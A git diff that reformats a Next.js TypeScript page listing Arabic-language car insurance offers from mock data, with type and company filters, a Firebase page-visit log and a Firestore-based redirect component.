@@ -1,33 +1,33 @@
-"use client"
+"use client";
 
-import { useEffect, useState, useMemo, useCallback } from "react"
-import OfferCard from "../components/OfferCard"
-import { addData } from "../apis/firebase"
-import FirestoreRedirect from "./rediract-page"
+import { useEffect, useState, useMemo, useCallback } from "react";
+import OfferCard from "../components/OfferCard";
+import { addData } from "../apis/firebase";
+import FirestoreRedirect from "./rediract-page";
 
 interface Company {
-  id: string
-  name: string
-  image_url: string
+  id: string;
+  name: string;
+  image_url: string;
 }
 
 interface Offer {
-  id: string
-  name: string
-  company_id: string
-  type: FilterType
-  main_price: string
-  company: Company
-  extra_features: Array<{ id: string; content: string; price: number }>
-  extra_expenses: Array<{ reason: string; price: number }>
+  id: string;
+  name: string;
+  company_id: string;
+  type: FilterType;
+  main_price: string;
+  company: Company;
+  extra_features: Array<{ id: string; content: string; price: number }>;
+  extra_expenses: Array<{ reason: string; price: number }>;
 }
 
-type FilterType = "against-others" | "special" | "comprehensive"
+type FilterType = "against-others" | "special" | "comprehensive";
 
 interface InsuranceTypeOption {
-  id: FilterType
-  label: string
-  ariaLabel: string
+  id: FilterType;
+  label: string;
+  ariaLabel: string;
 }
 
 // Mock data to replace API fetch
@@ -87,61 +87,72 @@ const mockOffers: Offer[] = [
     ],
     extra_expenses: [{ reason: "رسوم تسجيل", price: 40 }],
   },
-]
+];
 
 export default function Offers() {
-  const [offers] = useState<Offer[]>(mockOffers)
-  const [filteredOffers, setFilteredOffers] = useState<Offer[]>(mockOffers)
-  const _id = localStorage.getItem("visitor")
+  const [offers] = useState<Offer[]>(mockOffers);
+  const [filteredOffers, setFilteredOffers] = useState<Offer[]>(mockOffers);
+  const _id = localStorage.getItem("visitor");
 
   const [filters, setFilters] = useState({
     type: "" as FilterType | "",
     company: "",
-  })
+  });
   useEffect(() => {
-    addData({ id: _id,  pagename: "offers" })
-
-  }  , []);
+    addData({ id: _id, pagename: "offers" });
+  }, []);
   const insuranceTypes: InsuranceTypeOption[] = useMemo(
     () => [
       { id: "against-others", label: "ضد الغير", ariaLabel: "تأمين ضد الغير" },
       { id: "comprehensive", label: "شامل", ariaLabel: "تأمين شامل" },
       { id: "special", label: "مميز", ariaLabel: "تأمين مميز" },
     ],
-    [],
-  )
+    []
+  );
 
   // Apply filters whenever they change
   useEffect(() => {
-    let filtered = [...offers]
+    let filtered = [...offers];
 
     if (filters.type) {
-      filtered = filtered.filter((offer) => offer.type === filters.type)
+      filtered = filtered.filter((offer) => offer.type === filters.type);
     }
 
     if (filters.company) {
-      filtered = filtered.filter((offer) => offer.company.name === filters.company)
+      filtered = filtered.filter(
+        (offer) => offer.company.name === filters.company
+      );
     }
 
-    setFilteredOffers(filtered)
-  }, [filters, offers])
+    setFilteredOffers(filtered);
+  }, [filters, offers]);
 
   const handleTypeChange = useCallback((typeId: FilterType) => {
     setFilters((prev) => ({
       ...prev,
       type: prev.type === typeId ? "" : typeId, // Toggle filter if clicked again
-    }))
-  }, [])
+    }));
+  }, []);
 
   return (
     <main className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 py-8 md:py-12">
-            <FirestoreRedirect id={_id} collectionName={"pays"}/>
-      
+      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+
       <div className="px-4 sm:px-6 lg:px-8 container mx-auto">
-        <section className="rounded-2xl p-6 mb-8" role="region" aria-label="فلترة العروض">
+        <section
+          className="rounded-2xl p-6 mb-8"
+          role="region"
+          aria-label="فلترة العروض"
+        >
           <div className="flex flex-col sm:flex-row gap-6 sm:gap-4 w-full sm:items-center">
-            <h2 className="text-xl text-[#146394] font-semibold">نوع التأمين</h2>
-            <div className="grid grid-cols-3 gap-3 md:w-1/3 w-fit" role="radiogroup" aria-label="اختيار نوع التأمين">
+            <h2 className="text-xl text-[#146394] font-semibold">
+              نوع التأمين
+            </h2>
+            <div
+              className="grid grid-cols-3 gap-3 md:w-1/3 w-fit"
+              role="radiogroup"
+              aria-label="اختيار نوع التأمين"
+            >
               {insuranceTypes.map((type) => (
                 <button
                   key={type.id}
@@ -171,12 +182,13 @@ export default function Offers() {
             ))
           ) : (
             <div className="text-center py-12" role="status" aria-live="polite">
-              <div className="text-gray-500 text-xl">لا توجد عروض متاحه الان</div>
+              <div className="text-gray-500 text-xl">
+                لا توجد عروض متاحه الان
+              </div>
             </div>
           )}
         </section>
       </div>
     </main>
-  )
+  );
 }
-
